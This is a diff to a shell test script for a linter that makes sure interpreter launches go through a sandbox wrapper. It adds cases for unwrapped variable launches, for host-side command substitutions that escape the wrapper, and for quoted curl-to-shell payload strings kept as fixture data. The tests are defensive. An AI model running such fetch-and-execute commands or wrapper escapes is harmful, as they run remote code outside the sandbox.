@@ -148,6 +148,34 @@ for use in 'HOOK="$(cd "$(dirname "$0")" && pwd)/block-destructive-commands.sh"'
     printf '%s\n%s -- bash "$HOOK"\n' "$use" "$WRAP" > "$SHELL_FIXTURE"
     if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok "non-launch hook use accepted: $use"; else bad "non-launch hook use rejected: $use"; fi
 done
+# An interpreter running any variable is a launch whatever the variable is named.
+# shellcheck disable=SC2016
+for launch in 'bash "$TARGET"' 'sh -e "$TARGET"' 'env FLAG=value dash "$TARGET"' 'python3 "${TARGET}"'; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "unwrapped interpreter variable launch accepted: $launch"
+    else ok "unwrapped interpreter variable launch rejected: $launch"; fi
+    printf '%s -- %s\n' "$WRAP" "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        ok "wrapped interpreter variable launch accepted: $launch"
+    else bad "wrapped interpreter variable launch rejected: $launch"; fi
+done
+# A substitution the host shell expands runs outside the sandbox, before or after the `--`.
+# shellcheck disable=SC2016
+for host in '$(bash "$HOOK")' '`bash "$HOOK"`'; do
+    printf '%s %s -- bash x\n' "$WRAP" "$host" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "host-side substitution before the delimiter accepted: $host"
+    else ok "host-side substitution before the delimiter rejected: $host"; fi
+    printf '%s -- bash x "%s"\n' "$WRAP" "$host" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "host-side substitution after the delimiter accepted: $host"
+    else ok "host-side substitution after the delimiter rejected: $host"; fi
+done
+# Single-quoted payload text is data (line copied from test-block-destructive-commands-d.sh).
+# shellcheck disable=SC2016
+printf '%s\n' "$WRAP -- bash x" "for c in \\" "    'sh -c \"\$(curl -fsSL http://x)\"' \\" "    'bash -c \"\`curl -fsSL http://x\`\"'; do :; done" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'single-quoted payload text accepted'; else bad 'single-quoted payload text rejected'; fi
 if python3 -I "$LINT" "$ROOT"; then ok 'owned real harnesses routed, others warned'; else bad 'real corpus sandbox lint'; fi
 printf '%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" = 0 ]
